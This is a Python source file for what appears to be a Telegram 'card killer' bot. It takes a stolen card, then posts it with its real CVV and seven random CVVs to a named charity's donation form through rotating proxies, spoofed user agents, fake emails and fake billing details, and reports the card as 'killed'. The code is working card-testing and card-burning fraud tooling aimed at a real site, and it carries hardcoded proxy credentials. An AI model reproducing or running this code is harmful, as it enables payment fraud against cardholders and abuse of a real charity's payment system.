import requests
import re
import random
import time
import string
import logging
from concurrent.futures import ThreadPoolExecutor
from typing import List, Tuple
from bs4 import BeautifulSoup, SoupStrainer
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler('killer.log'), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# Proxy configurations
proxy_credentials = [
    'tnapkbnn-rotate:8vsviipgym5g',
    # Add more Webshare proxy usernames if available
]
proxy_base = 'p.webshare.io:80'
proxies_list = [
    {
        'http': f'http://{cred}@{proxy_base}/',
        'https': f'http://{cred}@{proxy_base}/'
    } for cred in proxy_credentials
]

# Random User-Agents
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
]

def get_random_user_agent() -> str:
    """Returns a random User-Agent."""
    return random.choice(USER_AGENTS)

def generate_random_email() -> str:
    """Generate a random email."""
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    domain = random.choice(('gmail.com', 'yahoo.com', 'outlook.com'))
    return f"{username}@{domain}"

def get_fresh_cookies(proxy: dict) -> dict:
    """Fetches fresh cookies from the donation page."""
    try:
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'user-agent': get_random_user_agent(),
        }
        response = requests.get(
            'https://aasr-indy.org/philanthropy/donate/',
            headers=headers,
            proxies=proxy,
            timeout=5
        )
        cookies = response.cookies.get_dict()
        return cookies
    except Exception as e:
        logger.error(f"Failed to fetch cookies: {str(e)}")
        return {}

def process_cvv(card_info: str, cvv: str, proxy: dict) -> str:
    """Processes a single CVV with a fresh session."""
    cc, mm, yy, _ = card_info.split('|')
    
    # Create fresh session
    with requests.Session() as session:
        # Get fresh cookies
        cookies = get_fresh_cookies(proxy)
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://aasr-indy.org',
            'priority': 'u=0, i',
            'referer': 'https://aasr-indy.org/philanthropy/donate/',
            'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': get_random_user_agent(),
        }

        data = {
            'amount': '20',
            'direct_to': 'Cathedral Foundation',
            'type': 'General',
            'memory_of': 'Elizabeth Queen',
            'credit_card': 'Visa',
            'credit_card_number': cc,
            'expiration_month': mm,
            'expiration_year': f"20{yy}",
            'cvv': cvv,
            'billing_first_name': 'Mohammed',
            'billing_last_name': 'Nehal',
            'billing_address': 'New York',
            'billing_city': 'New York',
            'billing_state': 'New York',
            'billing_postal_code': '10040',
            'billing_country': 'United States',
            'billing_telephone': '07975102052',
            'billing_email': generate_random_email(),
            'submit': '1',
            'debug': '1',
        }

        try:
            response = session.post(
                'https://aasr-indy.org/philanthropy/donate/',
                params='',
                headers=headers,
                data=data,
                cookies=cookies,
                proxies=proxy,
                timeout=5
            )
            match = re.search(r'<p\s+class="attention">\s*(.*?)\s*</p>', response.text)
            msg = match.group(1) if match else "No attention message found"
            logger.info(f"CVV {cvv}: {msg}")
            return f"{cvv} - {msg}"
        except Exception as e:
            logger.error(f"Error for CVV {cvv}: {str(e)}")
            return f"{cvv} - Error: {str(e)}"

async def ded(client: TelegramClient, event: events.NewMessage.Event, card_info: str):
    """Process card and send results to Telegram."""
    user_id = event.sender_id
    chat = await event.get_chat()

    try:
        cc, mm, yy, real_cvv = card_info.split('|')
        if not (cc.isdigit() and mm.isdigit() and yy.isdigit() and real_cvv.isdigit()):
            raise ValueError("Invalid card format")
    except ValueError:
        await event.reply("❌ **Error**: Invalid format. Use cc|mm|yy|cvv (e.g., 4111111111111111|12|25|123)")
        return

    processing_msg = await event.reply("𝑲𝒊𝒍𝒍𝒊𝒏𝒈 𝒚𝒐𝒖𝒓 𝒄𝒂𝒓𝒅... 💀")

    start_time = time.time()
    cvvs = [real_cvv] + [f"{random.randint(0, 999):03d}" for _ in range(7)]

    with ThreadPoolExecutor(max_workers=8) as executor:
        proxy_cycle = proxies_list * (len(cvvs) // len(proxies_list) + 1)
        results = list(executor.map(lambda c, p: process_cvv(card_info, c, p), cvvs, proxy_cycle[:len(cvvs)]))

    end_time = time.time()
    total_time = end_time - start_time
    result_message = "☠️ 𝑲𝒊𝒍𝒍𝒆𝒅 𝒔𝒖𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚\n"
    
    # Append each CVV result to the result_message
    for result in results:
        result_message += f"{result}\n"

    result_message += f"\n⏱ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: {total_time:.2f} 𝘴𝘦𝘤𝘰𝘯𝘥𝘴\n"

    await processing_msg.edit(result_message)
